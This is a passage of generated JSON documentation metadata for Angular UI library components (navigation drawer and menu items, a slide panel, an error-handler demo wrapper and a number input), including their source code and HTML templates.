        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-nav-drawer-list-item",
        "styleUrls": [],
        "styles": [],
        "templateUrl": [
          "./nav-drawer-list-item.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "navigationItem",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 12,
            "type": "NavigationChild",
            "decorators": []
          }
        ],
        "outputsClass": [],
        "propertiesClass": [],
        "methodsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { ChangeDetectionStrategy, Component, Input, ViewEncapsulation } from '@angular/core';\r\nimport { NavigationChild } from '../navigation';\r\n\r\n@Component({\r\n  selector: 'sto-nav-drawer-list-item',\r\n  templateUrl: './nav-drawer-list-item.component.html',\r\n  encapsulation: ViewEncapsulation.None,\r\n  changeDetection: ChangeDetectionStrategy.OnPush\r\n})\r\nexport class NavDrawerListItemComponent {\r\n  @Input()\r\n  navigationItem: NavigationChild;\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": "",
        "stylesData": "",
        "templateData": "<ng-template #linkContent >\r\n  <span>\r\n    {{ navigationItem.label }}\r\n  </span>\r\n  <mat-icon *ngIf=\"navigationItem.target && navigationItem.target === '_blank'\">open_in_new</mat-icon>\r\n</ng-template>\r\n\r\n<a *ngIf=\"navigationItem.link\"\r\n   [href]=\"navigationItem.link\"\r\n   [attr.target]=\"navigationItem.target || null\"\r\n   [routerLinkActive]=\"'active'\">\r\n  <ng-container *ngTemplateOutlet=\"linkContent\"></ng-container>\r\n</a>\r\n<a *ngIf=\"navigationItem.route\" [routerLink]=\"navigationItem.route\"\r\n   [attr.target]=\"navigationItem.target || null\"\r\n   [routerLinkActive]=\"'active'\">\r\n  <ng-container *ngTemplateOutlet=\"linkContent\"></ng-container>\r\n</a>\r\n"
      },
      {
        "name": "NavigationMenuComponent",
        "id": "component-NavigationMenuComponent-ac5e8ca23af0a631f53498e15e9d478a8ae08f9cc0c35c88d7b8767d74363be5f339fbdbb762c8fb1ae372b6381164b2564c7976ab3eba120870fd4704ce1ff6",
        "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/navigation-menu.component.ts",
        "encapsulation": [
          "ViewEncapsulation.None"
        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-navigation-menu",
        "styleUrls": [],
        "styles": [],
        "templateUrl": [
          "./navigation-menu.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "menu",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 11,
            "type": "Menu",
            "decorators": []
          }
        ],
        "outputsClass": [
          {
            "name": "onCommand",
            "defaultValue": "new EventEmitter<NavigateCommand>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 13,
            "type": "EventEmitter"
          }
        ],
        "propertiesClass": [],
        "methodsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { Component, EventEmitter, Input, Output, ViewEncapsulation } from '@angular/core';\r\nimport { Menu, NavigateCommand } from './menu';\r\n\r\n@Component({\r\n  selector: 'sto-navigation-menu',\r\n  templateUrl: './navigation-menu.component.html',\r\n  encapsulation: ViewEncapsulation.None\r\n})\r\nexport class NavigationMenuComponent {\r\n\r\n  @Input() menu: Menu;\r\n  // eslint-disable-next-line @angular-eslint/no-output-on-prefix\r\n  @Output() onCommand = new EventEmitter<NavigateCommand>();\r\n\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": "",
        "stylesData": "",
        "templateData": "<ng-container *ngIf=\"menu\">\r\n\t<mat-list class=\"sto-navigation\">\r\n\t\t<ng-container *ngFor=\"let group of menu.groups;  let last = last\">\r\n\t\t\t<mat-divider *ngIf=\"group.hasDivider\" class=\"sto-navigation__divider\"></mat-divider>\r\n\t\t\t<ng-container >\r\n\t\t\t\t<mat-expansion-panel class=\"sto-navigation__dropdown\" *ngIf=\"group.icon;else normal\">\r\n\t\t\t\t\t<mat-expansion-panel-header class=\"sto-navigation__dropdown__header\" expandedHeight=\"48px\">\r\n\t\t\t\t\t\t<mat-panel-title  class=\"sto-navigation__dropdown__title\" >\r\n\t\t\t\t\t\t\t<span class=\"sto-navigation__prefix\" >\r\n\t\t\t\t\t\t\t\t<mat-icon *ngIf=\"group.svgIcon\" [svgIcon]=\"group.icon\"></mat-icon>\r\n\t\t\t\t\t\t\t\t<mat-icon *ngIf=\"!group.svgIcon\" matListIcon>{{group.icon}}</mat-icon>\r\n\t\t\t\t\t\t\t</span>\r\n\t\t\t\t\t\t\t {{group.name}}\r\n\t\t\t\t\t\t</mat-panel-title>\r\n\t\t\t\t\t</mat-expansion-panel-header>\r\n\t\t\t\t\t<ng-container *ngFor=\"let item of group.items\">\r\n\t\t\t\t\t\t<sto-navigation-menu-item [item]=\"item\" (onCommand)=\"onCommand.emit($event)\" ></sto-navigation-menu-item>\r\n\t\t\t\t\t</ng-container>\r\n\t\t\t\t</mat-expansion-panel>\r\n\t\t\t</ng-container>\r\n\t\t\t<ng-template #normal>\r\n\t\t\t\t<h3 *ngIf=\"group.name\" mat-subheader>{{group.name}}</h3>\r\n\t\t\t\t<ng-container *ngFor=\"let item of group.items\">\r\n\t\t\t\t\t<sto-navigation-menu-item [item]=\"item\" (onCommand)=\"onCommand.emit($event)\"></sto-navigation-menu-item>\r\n\t\t\t\t</ng-container>\r\n\r\n\t\t\t</ng-template>\r\n\r\n\r\n\r\n\t\t</ng-container>\r\n\t</mat-list>\r\n</ng-container>\r\n"
      },
      {
        "name": "NavigationMenuItemComponent",
        "id": "component-NavigationMenuItemComponent-81f78efa867399b5a102de7d7a50976c5785159df0bced3ebe34a0dbd8cf1b278e91931eb703db959237097eea434582c55c777de4684470c61a8c988416aafa",
        "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/navigation-menu-item/navigation-menu-item.component.ts",
        "encapsulation": [
          "ViewEncapsulation.None"
        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-navigation-menu-item",
        "styleUrls": [],
        "styles": [],
        "templateUrl": [
          "./navigation-menu-item.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "item",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 12,
            "type": "MenuItem",
            "decorators": []
          }
        ],
        "outputsClass": [
          {
            "name": "onCommand",
            "defaultValue": "new EventEmitter<NavigateCommand>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 16,
            "type": "EventEmitter"
          }
        ],
            "propertiesClass": [
              {
                "name": "menuItemTypes",
                "defaultValue": "MenuItemTypes",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 17,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "urlPrefix",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "string",
                "optional": false,
                "description": "",
                "line": 18,
                "modifierKind": [
                  123
                ]
              }
            ],
            "methodsClass": [
                {
                    "name": "navigate",
                    "args": [
                      {
                        "name": "$event",
                        "type": "KeyboardEvent | MouseEvent",
                        "deprecated": false,
                        "deprecationMessage": ""
                      },
                      {
                        "name": "command",
                        "type": "any",
                        "deprecated": false,
                        "deprecationMessage": ""
                      },
                      {
                        "name": "item",
                        "type": "literal type",
                        "deprecated": false,
                        "deprecationMessage": ""
                      }
                    ],
                  "optional": false,
                  "returnType": "void",
                  "typeParameters": [],
                  "line": 25,
                  "deprecated": false,
                  "deprecationMessage": "",
                  "modifierKind": [
                    123
                  ],
                  "jsdoctags": [
                    {
                      "name": "$event",
                      "type": "KeyboardEvent | MouseEvent",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "tagName": {
                        "text": "param"
                      }
                    },
                    {
                      "name": "command",
                      "type": "any",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "tagName": {
                        "text": "param"
                      }
                    },
                    {
                      "name": "item",
                      "type": "literal type",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "tagName": {
                        "text": "param"
                      }
                    }
                  ]
                }
            ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { Component, EventEmitter, Inject, Input, Optional, Output, ViewEncapsulation } from '@angular/core';\r\nimport { USE_HASH_ROUTING } from '../../tokens';\r\nimport { MenuItem, MenuItemTypes, NavigateCommand } from '../menu';\r\n\r\n@Component({\r\n  selector: 'sto-navigation-menu-item',\r\n  templateUrl: './navigation-menu-item.component.html',\r\n  styles: [],\r\n  encapsulation: ViewEncapsulation.None\r\n})\r\nexport class NavigationMenuItemComponent {\r\n  @Input() item: MenuItem;\r\n  // eslint-disable-next-line @angular-eslint/no-output-on-prefix\r\n  @Output()\r\n  // eslint-disable-next-line @angular-eslint/no-output-on-prefix\r\n  onCommand = new EventEmitter<NavigateCommand>();\r\n  public menuItemTypes = MenuItemTypes;\r\n  public urlPrefix: string;\r\n\r\n  constructor(@Inject(USE_HASH_ROUTING) @Optional() useHash: boolean) {\r\n    this.urlPrefix = useHash === false ? '/' : '#/';\r\n  }\r\n\r\n  // eslint-disable-next-line @typescript-eslint/no-explicit-any\r\n  public navigate($event: KeyboardEvent | MouseEvent, command: any, item: { error?: string; }) {\r\n    if ( item.error ) {\r\n      return;\r\n    }\r\n    this.onCommand.emit({ $event, command });\r\n  }\r\n\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": "",
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "useHash",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 18,
          "jsdoctags": [
            {
              "name": "useHash",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "templateData": "<mat-list-item class=\"sto-navigation__item\"\r\n               (click)=\"navigate($event, item.command, item)\">\r\n  <ng-container *ngIf=\"!item.error; else error\">\r\n    <button mat-button>\r\n      <mat-icon *ngIf=\"item.svgIcon && item.icon\"\r\n                matListIcon\r\n                [svgIcon]=\"item.icon\"></mat-icon>\r\n      <mat-icon *ngIf=\"!item.svgIcon\"\r\n                matListIcon>{{item.icon}}</mat-icon>\r\n      <span class=\"sto-navigation__item__text\">\r\n        <ng-container *ngIf=\"item.command && item.command.type === menuItemTypes.External\">\r\n          <a (click)=\"$event.preventDefault()\"\r\n             [href]=\"item.command.arguments[0]\">\r\n            {{item.name}}\r\n          </a>\r\n        </ng-container>\r\n        <ng-container *ngIf=\"item.command && item.command.type === menuItemTypes.ExternalNew\">\r\n          <a (click)=\"$event.preventDefault()\"\r\n             [href]=\"item.command.arguments[0]\">\r\n            {{item.name}}\r\n          </a>\r\n          <span class=\"sto-navigation__suffix\">\r\n            <mat-icon>open_in_new</mat-icon>\r\n          </span>\r\n        </ng-container>\r\n        <ng-container *ngIf=\"item.command && item.command.type === menuItemTypes.Internal\">\r\n          <a (click)=\"$event.preventDefault()\"\r\n             [href]=\"urlPrefix + item.command.arguments.join('/')\">\r\n            {{item.name}}\r\n          </a>\r\n        </ng-container>\r\n        <ng-container *ngIf=\"item.command && item.command.type !== menuItemTypes.External\r\n\t\t\t && item.command.type !== menuItemTypes.ExternalNew\r\n\t\t\t && item.command.type !== menuItemTypes.Internal\">\r\n          <span>\r\n            <span>{{item.name}}</span>\r\n            <span class=\"sto-navigation__suffix\"\r\n                  *ngIf=\"item.command.type === menuItemTypes.Navigate\">\r\n              <mat-icon>keyboard_arrow_right</mat-icon>\r\n            </span>\r\n          </span>\r\n        </ng-container>\r\n\r\n      </span>\r\n    </button>\r\n  </ng-container>\r\n  <ng-template #error>\r\n    <button mat-button\r\n            disabled=\"disabled\">\r\n      <mat-icon *ngIf=\"item.svgIcon && item.icon\"\r\n                matListIcon\r\n                [svgIcon]=\"item.icon\"></mat-icon>\r\n      <mat-icon *ngIf=\"!item.svgIcon\"\r\n                matListIcon>{{item.icon}}</mat-icon>\r\n      <span class=\"sto-navigation__item__text sto-navigation__item__text--error\">{{item.name}}</span>\r\n    </button>\r\n  </ng-template>\r\n</mat-list-item>\r\n"
      },
      {
        "name": "NavigationPartComponent",
        "id": "component-NavigationPartComponent-a726c099ed943462faa06b99201c6a3378bd41aaddab447613a6eac604b2c2f535c438a6cb085a1f066daec4eed71524ec6c0fedb046ed3e9b377b87297f8565",
        "file": "libs/drawer/src/lib/sto-navigation/navigation-part/navigation-part.component.ts",
        "changeDetection": "ChangeDetectionStrategy.OnPush",
        "encapsulation": [
          "ViewEncapsulation.None"
        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-slide-panel",
        "styleUrls": [
          "./navigation-part.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./navigation-part.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "activePane",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 21,
            "type": "PaneType",
            "decorators": []
          }
        ],
        "outputsClass": [],
        "propertiesClass": [
          {
            "name": "baseClass",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 23,
            "decorators": [
              {
                "name": "HostBinding",
                "stringifiedArguments": "'class.sto-slide-panel'"
              }
            ]
          }
        ],
        "methodsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "class.sto-slide-panel",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 23,
            "type": "boolean",
            "decorators": []
          }
        ],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { ChangeDetectionStrategy, Component, HostBinding, Input, ViewEncapsulation } from '@angular/core';\r\nimport { animate, state, style, transition, trigger } from '@angular/animations';\r\n\r\nexport type PaneType = 'left' | 'right';\r\n\r\n@Component({\r\n  selector: 'sto-slide-panel',\r\n  styleUrls: ['./navigation-part.component.scss'],\r\n  templateUrl: './navigation-part.component.html',\r\n  changeDetection: ChangeDetectionStrategy.OnPush,\r\n  encapsulation: ViewEncapsulation.None,\r\n  animations: [\r\n    trigger('slide', [\r\n      state('left', style({transform: 'translateX(0)'})),\r\n      state('right', style({transform: 'translateX(-50%)'})),\r\n      transition('left <=> right', animate('300ms ease'))\r\n    ])\r\n  ]\r\n})\r\nexport class NavigationPartComponent {\r\n  @Input() activePane: PaneType;\r\n  @HostBinding('class.sto-slide-panel')\r\n  baseClass = true;\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": ":host {\r\n  display: block;\r\n  overflow: hidden;\r\n}\r\n\r\n.panes {\r\n  min-height: calc(100% - 40px);\r\n  width: 200%;\r\n\r\n  display: flex;\r\n  div {\r\n    flex: 1;\r\n  }\r\n}\r\n",
            "styleUrl": "./navigation-part.component.scss"
          }
        ],
        "stylesData": "",
        "templateData": "<div class=\"panes\" [@slide]=\"activePane\">\r\n  <div><ng-content select=\"[leftPane]\"></ng-content></div>\r\n  <div><ng-content select=\"[rightPane]\"></ng-content></div>\r\n</div>\r\n"
      },
      {
        "name": "NextWrapperComponent",
        "id": "component-NextWrapperComponent-498d07118640af56499aaf20a9c2077b6c46bba76c932ab22263dfc299f2b7fbb43f9db943817229ad0b0c07b271332e5027c9507031fbd4d3d97378542b334b",
        "file": "libs/error-handler/src/lib/wrapper.ts",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "next-wrapper",
        "styleUrls": [],
        "styles": [],
        "template": "<button mat-button\n        (click)=\"overRide(404)\">Overridden 404\n</button>\n<button mat-button\n        (click)=\"showError(s)\"\n        *ngFor=\"let s of errors\">{{s}} {{ s === 401 ? '(App Override)' : ''}}</button>\n",
        "templateUrl": [],
        "viewProviders": [],
        "inputsClass": [],
        "outputsClass": [],
        "propertiesClass": [
          {
            "name": "errors",
            "defaultValue": "[\r\n    0,\r\n    400,\r\n    401,\r\n    403,\r\n    404,\r\n    409,\r\n    500,\r\n    501,\r\n    503\r\n  ]",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "[]",
            "optional": false,
            "description": "",
            "line": 26,
            "modifierKind": [
              123
            ]
          }
        ],
        "methodsClass": [
          {
            "name": "overRide",
            "args": [
              {
                "name": "status",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 53,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "status",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "showError",
            "args": [
              {
                "name": "status",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 41,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "status",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { Component, Injectable, NgModule } from '@angular/core';\r\nimport { HttpClient, HttpClientModule, HttpErrorResponse } from '@angular/common/http';\r\nimport { CommonModule } from '@angular/common';\r\nimport { MatButtonModule } from '@angular/material/button';\r\nimport {\r\n  CUSTOM_ERROR_HANDLER, ERROR_LOGGER,\r\n  ErrorHandlerService,\r\n  Handler,\r\n  HttpError,\r\n  StoErrorHandler\r\n} from '@ngx-stoui/error-handler';\r\n\r\n@Component({\r\n  selector: 'next-wrapper',\r\n  template: `\r\n    <button mat-button\r\n            (click)=\"overRide(404)\">Overridden 404\r\n    </button>\r\n    <button mat-button\r\n            (click)=\"showError(s)\"\r\n            *ngFor=\"let s of errors\">{{s}} {{ s === 401 ? '(App Override)' : ''}}</button>\r\n  `,\r\n  providers: []\r\n})\r\nexport class NextWrapperComponent {\r\n  public errors = [\r\n    0,\r\n    400,\r\n    401,\r\n    403,\r\n    404,\r\n    409,\r\n    500,\r\n    501,\r\n    503\r\n  ];\r\n\r\n  constructor(private service: ErrorHandlerService) {\r\n  }\r\n\r\n  showError(status: number) {\r\n    const err = new HttpErrorResponse({\r\n      status,\r\n      error: {\r\n        message: 'server error message'\r\n      },\r\n      statusText: 'Error',\r\n      url: 'http://errorhandler/api'\r\n    });\r\n    this.service.handler(err);\r\n  }\r\n\r\n  overRide(status: number) {\r\n    const err = new HttpErrorResponse({\r\n      status,\r\n      error: {\r\n        message: 'server error message'\r\n      },\r\n      statusText: 'Error',\r\n      url: 'http://errorhandler/api'\r\n    });\r\n    const handler = function (err: HttpErrorResponse) {\r\n      const e = new HttpError(err);\r\n      e.title = 'Local override 404';\r\n      e.text = 'Local override not found item';\r\n      return e;\r\n    };\r\n    this.service.handler(err, handler);\r\n  }\r\n}\r\n\r\n@Injectable({\r\n  providedIn: 'root'\r\n})\r\nexport class ErrorHandlerImpl implements StoErrorHandler {\r\n  [ code: number ]: Handler;\r\n\r\n  401(err: HttpErrorResponse) {\r\n    const error = new HttpError(err);\r\n    error.title = 'Custom not signed in';\r\n    error.text = 'Custom not signed in text';\r\n    return error;\r\n  }\r\n}\r\n\r\n@Injectable({\r\n  providedIn: 'root'\r\n})\r\nexport class Logger {\r\n  constructor(private http: HttpClient) {\r\n  }\r\n\r\n  log(err: HttpError) {\r\n    // This method will typically go to the application backend or a central log repository\r\n    console.log('Error', err);\r\n  }\r\n}\r\n\r\nfunction LoggerFactory(http: HttpClient) {\r\n  return new Logger(http);\r\n}\r\n\r\n@NgModule({\r\n  declarations: [ NextWrapperComponent ],\r\n  imports: [ CommonModule, MatButtonModule, HttpClientModule ],\r\n  exports: [ NextWrapperComponent ],\r\n  providers: [\r\n    { provide: CUSTOM_ERROR_HANDLER, useClass: ErrorHandlerImpl },\r\n    { provide: ERROR_LOGGER, useFactory: LoggerFactory, deps: [ HttpClient ] }\r\n  ]\r\n})\r\nexport class WrapperModule {\r\n}\r\n\r\n",
        "assetsDirs": [],
        "styleUrlsData": "",
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "service",
              "type": "ErrorHandlerService",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 36,
          "jsdoctags": [
            {
              "name": "service",
              "type": "ErrorHandlerService",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      },
      {
        "name": "NumberInputComponent",
        "id": "component-NumberInputComponent-cdecd0901a70158ec730dae41e8ecdef2e5ea272b29889de7898f80d876dc99a84f40e83a016f1a6c24cd052031ed16c211b360f237ea46ecf457658693e0a5d",
        "file": "libs/form/src/lib/number-input/number-input/number-input.component.ts",
        "changeDetection": "ChangeDetectionStrategy.OnPush",
        "encapsulation": [
          "ViewEncapsulation.None"
        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [
          {
            "name": "{ provide: MatFormFieldControl, useExisting: NumberInputComponent }",
            "type": "component"
          }
        ],
        "selector": "sto-number-input",
        "styleUrls": [
          "./number-input.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./number-input.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "disabled",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 87,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "dynamicFractionSize",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 58,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "fractionSize",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 113,
            "type": "number",
            "decorators": []
          },
          {
            "name": "placeholder",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 134,
            "type": "string",
            "decorators": []
          },
          {
            "name": "readonly",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 101,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "required",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 158,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "tabIndex",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 146,
            "type": "number",
            "decorators": []
          },
          {
            "name": "value",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 170,
            "type": "number",
            "decorators": []
          }
        ],
            "outputsClass": [
              {
                "name": "ngModelChange",
                "defaultValue": "new EventEmitter<number | null>()",
                "deprecated": false,
                "deprecationMessage": "",
                "line": 84,
                "type": "EventEmitter"
              }
            ],
            "propertiesClass": [
              {
                "name": "_disabled",
                "defaultValue": "false",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 98,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_fractionSize",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "number",
                "optional": false,
                "description": "",
                "line": 126,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_placeholder",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "string",
                "optional": false,
                "description": "",
                "line": 143,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_readonly",
                "defaultValue": "false",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 110,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_required",
                "defaultValue": "false",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 167,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_tabIndex",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "number",
                "optional": false,
                "description": "",
                "line": 155,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_value",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "number | null",
                "optional": false,
                "description": "",
                "line": 181,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "autofilled",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "boolean",
                "optional": false,
                "description": "",
                "line": 53
              },
              {
                "name": "controlType",
                "defaultValue": "'number-input'",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "string",
                "optional": false,
                "description": "",
                "line": 54
              },
              {
                "name": "ctrl",
                "defaultValue": "new FormControl()",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 55
              },
              {
                "name": "describedBy",
                "defaultValue": "''",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "string",
                "optional": false,
                "description": "",
                "line": 68,
                "decorators": [
                  {
                    "name": "HostBinding",
                    "stringifiedArguments": "'attr.aria-describedby'"
                  }
                ]
              },
              {
                "name": "errorState",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "boolean",
                "optional": false,
                "description": "",
                "line": 70,
                "inheritance": {
                  "file": "FormFieldBase"
                }
              },
              {
                "name": "focused",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "boolean",
                "optional": false,
                "description": "",
                "line": 52
              },
              {
                "name": "id",
                "defaultValue": "`value-unit-input-${NumberInputComponent.nextId++}`",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 66,
                "decorators": [
                  {
                    "name": "HostBinding",
                    "stringifiedArguments": ""
                  }
                ]
              },
              {
                "name": "nextId",
                "defaultValue": "0",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "number",
                "optional": false,
                "description": "",
                "line": 49,
                "modifierKind": [
                  124
                ]
              },
              {
                "name": "ngControl",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "NgControl",
                "optional": false,
                "description": "",
                "line": 183,
                "decorators": [
                  {
                    "name": "Optional",
                    "stringifiedArguments": ""
                  },
                  {
                    "name": "Self",
                    "stringifiedArguments": ""
                  }
                ],
                "modifierKind": [
                  123
                ],
                "inheritance": {
                  "file": "FormFieldBase"
                }
              },
              {
                "name": "numberFormatter",
                "defaultValue": "new NumberInputPipe()",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 51,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "onChange",
                "defaultValue": "() => {...}",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 240
              },
              {
                "name": "onTouched",
                "defaultValue": "() => {...}",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 243
              },
              {
                "name": "stateChanges",
                "defaultValue": "new Subject<void>()",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 50,
                "inheritance": {
                  "file": "FormFieldBase"
                }
              },
              {
                "name": "sub",
                "defaultValue": "new Subscription()",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 56,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "_defaultErrorStateMatcher",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "ErrorStateMatcher",
                "optional": false,
                "description": "",
                "line": 19,
                "modifierKind": [
                  123
                ],
                "inheritance": {
                  "file": "FormFieldBase"
                }
              },
              {
                "name": "_elementRef",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "ElementRef",
                "optional": false,
                "description": "",
                "line": 18,
                "modifierKind": [
                  123
                ],
                "inheritance": {
                  "file": "FormFieldBase"
                }
              },
              {
                "name": "_parentForm",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "NgForm",
                "optional": false,
                "description": "",
                "line": 20,
                "modifierKind": [
                  123
                ],
                "inheritance": {
                  "file": "FormFieldBase"
                }
              },
              {
                "name": "_parentFormGroup",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "FormGroupDirective",
                "optional": false,
                "description": "",
                "line": 21,
                "modifierKind": [
                  123
                ],
                "inheritance": {
                  "file": "FormFieldBase"
                }
              },
              {
                "name": "errorStateMatcher",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "ErrorStateMatcher",
                "optional": false,
                "description": "",
                "line": 16,
                "inheritance": {
                  "file": "FormFieldBase"
                }
              }
            ],
            "methodsClass": [
              {
                "name": "matOnTouched",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 246,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "ngDoCheck",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 199,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "ngOnDestroy",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 224,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "ngOnInit",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 205,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "onContainerClick",
                "args": [
                  {
                    "name": "event",
                    "type": "MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 231,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "event",
                    "type": "MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "registerOnChange",
